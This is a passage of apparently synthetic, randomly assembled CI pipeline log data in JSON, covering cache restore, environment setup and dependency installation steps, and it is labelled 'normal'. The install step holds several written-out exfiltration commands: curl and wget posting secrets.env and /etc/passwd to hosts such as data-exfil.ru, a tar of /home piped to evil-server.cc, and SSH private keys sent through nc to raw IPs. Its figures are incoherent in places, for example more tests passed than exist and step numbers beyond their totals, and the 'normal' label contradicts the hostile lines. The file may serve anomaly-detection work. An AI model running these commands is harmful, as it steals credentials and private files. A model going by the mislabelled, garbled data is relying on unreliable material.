          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_auth_login (21ms)",
          "Cache miss for key-4255",
          "TLS handshake completed",
          "FAILED: test_api_health",
          "\u2717 build failed with exit code 120",
          "GET /health - 204 (54ms)",
          "Exception: RuntimeError",
          "HEAD is now at 614009d",
          "[12:47:42] WARN: Deprecated API usage",
          "FAILED: test_cache_hit",
          "Verifying...",
          "[12:47:42] DEBUG: Connection pool: 1 active",
          "pip: Downloading lodash-2.12.tar.gz",
          "Exception: NullPointerException",
          "Success!",
          "NODE_ENV=production",
          "Processing...",
          "Step 4/20: Deploying",
          "Pulling image: python:3.11",
          "[12:47:42] INFO: Connecting to database",
          "Step 7/15: Deploying",
          "Pulling image: node:latest",
          "Uploading artifact 'coverage' (16 files)",
          "Coverage: 88% statements, 63% branches",
          "\u2713 Task completed in 4610ms",
          "[12:47:42] WARN: Deprecated API usage",
          "[12:47:42] INFO: Cache refreshed",
          "npm install: added 461 packages",
          "  PASS: test_cache_hit (420ms)",
          "Pushing to registry...",
          "Layer 9/12: RUN command",
          "Step 2/16: Running migrations",
          "Checking out master branch",
          "Test Suites: 44 passed, 43 total",
          "Time: 54.872s",
          "Step 16/18: Linting",
          "WARNING: lodash has known vulnerabilities",
          "Connection established",
          "Coverage: 79% statements, 100% branches",
          "[12:47:42] DEBUG: Query executed in 7ms",
          "[12:47:42] WARN: Deprecated API usage",
          "Processing...",
          "Cache saved successfully",
          "[12:47:42] INFO: Processing request",
          "[12:47:42] DEBUG: Loading configuration",
          "pip install: Successfully installed jest-3.3",
          "Connection established",
          "Artifact uploaded: dist.zip (10MB)",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Compiling components/main.py...",
          "[12:47:42] WARN: Deprecated API usage",
          "Uploading artifact 'build' (44 files)",
          "Bundling styles.js",
          "\u2713 deploy completed",
          "\u2713 lint completed",
          "Verifying...",
          "WARNING: jest has known vulnerabilities",
          "Waiting...",
          "Compiling components/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Minifying main.js",
          "[12:47:42] DEBUG: Loading configuration",
          "Done.",
          "Optimizing 87 modules...",
          "Already up to date.",
          "[12:47:42] WARN: Deprecated API usage",
          "GET /status - 204 (21ms)",
          "Checking out master branch",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "TLS handshake completed",
          "[12:47:42] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "Connection established",
          "npm notice: created a lockfile",
          "Bundling vendor.js",
          "Compiling src/handler.rs...",
          "Test Suites: 48 passed, 47 total",
          "WARNING: react has known vulnerabilities",
          "NODE_ENV=development",
          "Step 14/23: Deploying",
          "[12:47:42] ERROR: Connection failed",
          "Exception: ValueError",
          "Checking out main branch",
          "[12:47:42] INFO: Starting build process",
          "[12:47:42] DEBUG: Query executed in 43ms",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "WARNING: webpack has known vulnerabilities",
          "pip: Collecting prettier",
          "WARNING: express has known vulnerabilities",
          "Loading...",
          "[12:47:42] INFO: Starting build process",
          "Step 14/24: Testing",
          "\u2713 Task completed in 2980ms",
          "TLS handshake completed",
          "[12:47:42] INFO: Request completed",
          "Step 18/19: Building",
          "Artifact uploaded: dist.zip (53MB)",
          "npm install: resolved 954 packages",
          "[12:47:42] INFO: Starting build process",
          "Compiling src/service.java...",
          "  PASS: unit/test_db_connect.spec.js",
          "Snapshots: 32 passed, 23 total",
          "GET /status - 204 (12ms)",
          "Using Node.js 18.0.3",
          "Pulling image: python:18",
          "Pushing to registry...",
          "Ready.",
          "Ran 51 tests in 53s",
          "[12:47:42] DEBUG: Memory usage: 1341MB",
          "Cache miss for key-7191",
          "Cache restored successfully (141MB)",
          "Optimizing 98 modules...",
          "[12:47:42] INFO: Cache refreshed",
          "Creating production build...",
          "[12:47:42] DEBUG: Initializing service",
          "pip install: Successfully installed webpack-4.3",
          "pip: Downloading express-4.15.tar.gz",
          "Compiling utils/handler.rs...",
          "Checking out main branch",
          "Cache restored successfully (44MB)",
          "Using Node.js 15.12.3",
          "[12:47:42] INFO: Cache refreshed",
          "Time: 1.210s",
          "NODE_ENV=production",
          "Ready.",
          "\u2713 build completed",
          "Step 10/15: Linting",
          "Tests: 359 passed, 473 total",
          "[12:47:42] DEBUG: Loading configuration",
          "Creating production build...",
          "\u2713 lint completed",
          "Generating source maps...",
          "[12:47:42] ERROR: Connection failed",
          "Ready.",
          "pip install: Successfully installed jest-2.4",
          "Exception: TypeError",
          "Test Suites: 26 passed, 46 total",
          "[12:47:42] DEBUG: Memory usage: 1026MB",
          "Completed.",
          "\u2713 validate completed",
          "Step 12/16: Testing",
          "Using Python 3.9",
          "[12:47:42] DEBUG: Initializing service",
          "Building Docker image...",
          "Fetching submodules...",
          "Compiling utils/handler.rs...",
          "\u2713 All checks passed",
          "OK",
          "Cache restored successfully (369MB)",
          "\u2713 Step 'setup' succeeded",
          "Environment: staging",
          "Finished.",
          "FAILED: test_cache_hit",
          "Pushing to registry...",
          "Cache invalidated: node_modules",
          "Image pulled successfully",
          "[12:47:42] INFO: Starting build process",
          "POST /data - 200 (93ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Ready.",
          "pip install: Successfully installed express-5.11",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-17T12:50:57.678660",
        "finished_at": "2025-12-17T12:51:18.040612",
        "log_lines": [
          "=== Step: setup_environment ===",
          "npm install: resolved 919 packages",
          "WARNING: lodash has known vulnerabilities",
          "[12:47:42] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Finished.",
          "npm notice: created a lockfile",
          "pip install: Successfully installed react-4.16",
          "Snapshots: 41 passed, 4 total",
          "\u2713 All checks passed",
          "[12:47:42] ERROR: Connection failed",
          "Ready.",
          "Step 19/19: Testing",
          "\u2713 Step 'checkout' succeeded",
          "Artifact downloaded: 16MB",
          "npm install: resolved 1925 packages",
          "Environment: test",
          "pip: Downloading jest-1.16.tar.gz",
          "  PASS: test_api_health (265ms)",
          "Installing prettier@2.13.0",
          "FAILED: test_user_create",
          "Artifact uploaded: dist.zip (21MB)",
          "[12:47:42] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 17/15: Deploying",
          "Step 3/15: Testing",
          "[12:47:42] DEBUG: Initializing service",
          "Uploading artifact 'coverage' (11 files)",
          "Layer 4/11: ENV command",
          "Compiling utils/utils.go...",
          "Waiting...",
          "[12:47:42] WARN: Deprecated API usage",
          "Test Suites: 39 passed, 32 total",
          "Platform: linux-x64",
          "Optimizing 34 modules...",
          "[12:47:42] DEBUG: Initializing service",
          "[12:47:42] WARN: Deprecated API usage",
          "Bundling vendor.css",
          "Fetching submodules...",
          "[12:47:42] DEBUG: Query executed in 82ms",
          "[12:47:42] DEBUG: Query executed in 68ms",
          "  PASS: test_cache_hit (150ms)",
          "FAILED: test_cache_hit",
          "Ready.",
          "npm notice: package.json updated",
          "Coverage: 77% statements, 64% branches",
          "Finished.",
          "HEAD is now at cb1a8bf",
          "Compiling utils/main.py...",
          "Artifact uploaded: dist.zip (34MB)",
          "Pulling image: alpine:18",
          "Step 13/18: Linting",
          "Building Docker image...",
          "[12:47:42] DEBUG: Initializing service",
          "Step 11/24: Testing",
          "npm install: resolved 435 packages",
          "[12:47:42] DEBUG: Connection pool: 1 active",
          "Waiting...",
          "\u2713 Step 'setup' succeeded",
          "  PASS: e2e/test_cache_hit.spec.js",
          "\u2713 Task completed in 2613ms",
          "pip install: Successfully installed react-3.6",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "HEAD is now at b20d9b3",
          "Cache saved successfully",
          "Tests: 471 passed, 214 total",
          "Ready.",
          "Environment: development",
          "[12:47:42] INFO: Connecting to database",
          "HEAD is now at c61ebbc",
          "WARNING: jest has known vulnerabilities",
          "Ready.",
          "\u2713 Step 'setup' succeeded",
          "Generating source maps...",
          "Compiling utils/app.ts...",
          "Bundling vendor.css",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Downloading react-4.9.tar.gz",
          "\u2713 Task completed in 4857ms",
          "Completed.",
          "pip: Installing build dependencies...",
          "[12:47:42] INFO: Connecting to database",
          "Coverage: 95% statements, 88% branches",
          "[12:47:42] DEBUG: Query executed in 74ms",
          "Completed.",
          "pip install: Successfully installed eslint-5.17",
          "Finished.",
          "\u2717 build failed with exit code 86",
          "Compiling components/service.java...",
          "Cache hit for key-6613",
          "Compiling utils/utils.go...",
          "Transforming 307 files...",
          "Cache miss for key-8665",
          "Tests: 411 passed, 243 total",
          "Step 13/25: Building",
          "[12:47:42] DEBUG: Memory usage: 1107MB",
          "Ran 134 tests in 9s",
          "Building Docker image...",
          "Processing...",
          "Verifying...",
          "Exception: ValueError",
          "Waiting...",
          "Compiling src/utils.go...",
          "[12:47:42] DEBUG: Memory usage: 680MB",
          "Tests: 68 passed, 187 total",
          "[12:47:42] INFO: Connecting to database",
          "Image pulled successfully",
          "Layer 2/14: ENV command",
          "Artifact downloaded: 11MB",
          "GET /status - 201 (29ms)",
          "Installing jest@4.18.8",
          "Cache invalidated: build",
          "Layer 10/11: RUN command",
          "pip install: Successfully installed lodash-5.11",
          "Platform: darwin-arm64",
          "[12:47:42] DEBUG: Connection pool: 9 active",
          "Step 14/16: Deploying",
          "HEAD is now at f5cf022",
          "WARNING: jest has known vulnerabilities",
          "[12:47:42] INFO: Request completed",
          "[12:47:42] INFO: Connecting to database",
          "Cache hit for key-4297",
          "[12:47:42] WARN: Deprecated API usage",
          "Step 18/15: Deploying",
          "pip: Collecting lodash",
          "FAILED: test_cache_hit",
          "[12:47:42] INFO: Request completed",
          "Connection established",
          "npm install: added 404 packages",
          "Step 20/23: Deploying",
          "HEAD is now at 17a42ca",
          "Cache saved successfully",
          "[12:47:42] DEBUG: Memory usage: 262MB",
          "Connection established",
          "Step 4/24: Testing",
          "Compiling utils/main.py...",
          "Pushing to registry...",
          "Generating source maps...",
          "OK",
          "  PASS: e2e/test_user_create.spec.js",
          "Step 8/24: Linting",
          "Cache invalidated: dependencies",
          "Switched to branch 'bugfix/task-177'",
          "Loading...",
          "pip: Collecting jest",
          "[12:47:42] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "Compiling src/utils.go...",
          "Platform: win32-x64",
          "WARNING: express has known vulnerabilities",
          "Connection established",
          "Minifying app.js",
          "Compiling lib/utils.go...",
          "FAILED: test_api_health",
          "Finished.",
          "Fetching from https://docker.io/package.json",
          "[12:47:42] INFO: Cache refreshed",
          "pip: Collecting react",
          "\u2713 Task completed in 3331ms",
          "Success!",
          "[12:47:42] INFO: Processing request",
          "Layer 1/10: COPY command",
          "npm notice: created a lockfile",
          "\u2713 build completed",
          "yarn add: Done in 5.38s",
          "Bundling vendor.js",
          "Platform: win32-x64",
          "[12:47:42] DEBUG: Memory usage: 148MB",
          "[12:47:42] INFO: Cache refreshed",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-17T12:51:18.040612",
        "finished_at": "2025-12-17T12:52:19.126467",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Step 8/24: Installing dependencies",
          "pip: Collecting lodash",
          "Step 4/25: Building",
          "Creating production build...",
          "Optimizing 88 modules...",
          "[12:47:42] DEBUG: Connection pool: 1 active",
          "Done.",
          "Cache hit for key-8934",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Test Suites: 37 passed, 20 total",
          "[12:47:42] DEBUG: Initializing service",
          "\u2713 build completed",
          "[12:47:42] INFO: Connecting to database",
          "Time: 39.154s",
          "Success!",
          "\u2713 Step 'build' succeeded",
          "Cache restored successfully (296MB)",
          "Step 10/25: Running migrations",
          "[12:47:42] INFO: Processing request",
          "Generating source maps...",
          "Compiling lib/utils.go...",
          "Completed.",
          "npm notice: package.json updated",
          "Completed.",
          "Platform: linux-x64",
          "HEAD is now at e75c26c",
          "\u2713 Step 'build' succeeded",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Cache invalidated: build",
          "pip: Downloading prettier-4.10.tar.gz",
          "NODE_ENV=development",
          "Waiting...",
          "  PASS: test_api_health (166ms)",
          "Checking out master branch",
          "  PASS: test_db_connect (217ms)",
          "[12:47:42] INFO: Connecting to database",
          "\u2713 Task completed in 4818ms",
          "Finished.",
          "HEAD is now at e58bf8f",
          "POST /api - 202 (47ms)",
          "pip: Downloading prettier-3.19.tar.gz",
          "Sending 15MB of data to malicious-pool.xyz",
          "Completed.",
          "pip: Downloading express-2.17.tar.gz",
          "Cache restored successfully (455MB)",
          "Waiting...",
          "[12:47:42] DEBUG: Memory usage: 531MB",
          "[12:47:42] DEBUG: Loading configuration",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Cache restored successfully (151MB)",
          "FAILED: test_user_create",
          "Processing...",
          "npm install: resolved 353 packages",
          "Environment: development",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pushing to registry...",
          "Cache restored successfully (211MB)",
          "npm notice: package.json updated",
          "Minifying app.js",
          "Already up to date.",
          "[12:47:42] DEBUG: Initializing service",
          "Sending 292MB of data to crypto-mine.io",
          "Cache saved successfully",
          "Compiling utils/handler.rs...",
          "Bundling runtime.css",
          "Sending 54MB of data to malicious-pool.xyz",
          "npm notice: created a lockfile",
          "Artifact downloaded: 21MB",
          "Switched to branch 'feature/task-937'",
          "[12:47:42] DEBUG: Query executed in 52ms",
          "[12:47:42] ERROR: Connection failed",
          "FAILED: test_cache_hit",
          "Platform: win32-x64",
          "[12:47:42] INFO: Cache refreshed",
          "Installing react@3.10.10",
          "Using Node.js 19.6.3",
          "Using Python 3.12",
          "[12:47:42] WARN: Deprecated API usage",
          "Optimizing 65 modules...",
          "Step 15/22: Deploying",
          "Using Python 3.12",
          "Pushing to registry...",
          "WARNING: eslint has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "[12:47:42] DEBUG: Connection pool: 14 active",
          "Pulling image: alpine:18",
          "Loading...",
          "Fetching from https://githubusercontent.com/package.json",
          "Success!",
          "Coverage: 87% statements, 89% branches",
          "Time: 99.701s",
          "Coverage: 89% statements, 87% branches",
          "Cache saved successfully",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Checking out master branch",
          "\u2713 package completed",
          "Transforming 897 files...",
          "Already up to date.",
          "Transforming 363 files...",
          "npm notice: created a lockfile",
          "[12:47:42] DEBUG: Loading configuration",
          "Test Suites: 8 passed, 23 total",
          "GET /status - 200 (35ms)",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (325ms)",
          "Sending 455MB of data to evil-server.cc",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 59.64.38.49 9412",
          "Compiling components/utils.go...",
          "pip install: Successfully installed eslint-4.2",
          "[12:47:42] ERROR: Connection failed",
          "[12:47:42] INFO: Processing request",
          "Step 19/18: Installing dependencies",
          "Connection established",
          "Building Docker image...",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "npm install: added 379 packages",
          "\u2713 All checks passed",
          "Waiting...",
          "[12:47:42] DEBUG: Initializing service",
          "Compiling utils/handler.rs...",
          "Cache restored successfully (279MB)",
          "Creating production build...",
          "Ready.",
          "Image pulled successfully",
          "Time: 28.51s",
          "[12:47:42] DEBUG: Connection pool: 12 active",
          "[12:47:42] INFO: Starting build process",
          "pip install: Successfully installed jest-4.1",
          "  PASS: test_db_connect (250ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 40.215.163.201 43768",
          "  PASS: test_cache_hit (99ms)",
          "Generating source maps...",
          "Step 4/18: Running migrations",
          "[12:47:42] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Compiling src/app.ts...",
          "Step 17/20: Installing dependencies",
          "[12:47:42] ERROR: Connection failed",
          "Time: 113.578s",
          "Generating source maps...",
          "Artifact downloaded: 19MB",
          "[12:47:42] DEBUG: Query executed in 11ms",
          "Test Suites: 19 passed, 29 total",
          "Pushing to registry...",
          "Finished.",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Step 6/15: Testing",
          "\u2713 Step 'install' succeeded",
          "Using Node.js 14.13.10",
          "Cache miss for key-7619",
          "Coverage: 98% statements, 68% branches",
          "[12:47:42] INFO: Processing request",
          "Switched to branch 'feature/task-171'",
          "Processing...",
          "HEAD is now at 784d720",
          "Connection established",
          "Sending 100MB of data to evil-server.cc",
          "[12:47:42] ERROR: Connection failed",
          "[12:47:42] DEBUG: Initializing service",
          "Transforming 754 files...",
          "HEAD is now at 00bc117",
          "[12:47:42] DEBUG: Query executed in 57ms",
          "[12:47:42] WARN: Deprecated API usage",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 128.29.34.102 6011",
          "[12:47:42] DEBUG: Memory usage: 1043MB",
          "Ran 110 tests in 35s",
          "GET /api - 201 (25ms)",
          "[12:47:42] DEBUG: Connection pool: 6 active",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Creating production build...",
          "\u2713 All checks passed",
          "Compiling components/app.ts...",
          "Transforming 785 files...",
          "Step 1/15: Building",
          "pip install: Successfully installed axios-4.3",
          "npm install: added 95 packages",
          "Cache saved successfully",
          "Loading...",
          "Coverage: 85% statements, 76% branches",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "pip: Collecting axios",
          "Bundling vendor.js",
          "=== Step install_dependencies completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}